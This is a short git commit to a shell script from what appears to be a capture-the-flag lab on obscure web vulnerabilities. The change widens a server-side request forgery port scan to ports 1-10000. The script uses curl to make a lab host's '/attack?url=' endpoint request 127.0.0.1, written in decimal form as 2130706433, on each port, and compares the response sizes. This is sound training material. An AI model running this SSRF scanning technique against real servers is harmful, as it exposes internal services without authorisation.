2d9416ef66cc3e4e65ca31e05b8d442bc2a2f179
Ulli Weichert <ulli.weichert@cloudsupplies.de>
2021-10-22 22:13:34 +0200

    change the range

--- ZTH_Obscure_Web_Vulns/SSRF/attempt.sh
+++ ZTH_Obscure_Web_Vulns/SSRF/attempt.sh
@@ -4,8 +4,7 @@ url="http://10.10.144.204:8000/attack?url="
 param="http%3A%2F%2F2130706433%3A$"
 counter=0
 
-#for i in {1..10000}; 
-for i in {3303..3310}; 
+for i in {1..10000}; 
 	do 
 		echo "Working on Port ${i}"
 		size=$(curl http://10.10.144.204:8000/attack?url=http://2130706433:${i} -w %{size_download} --silent --output /dev/null)
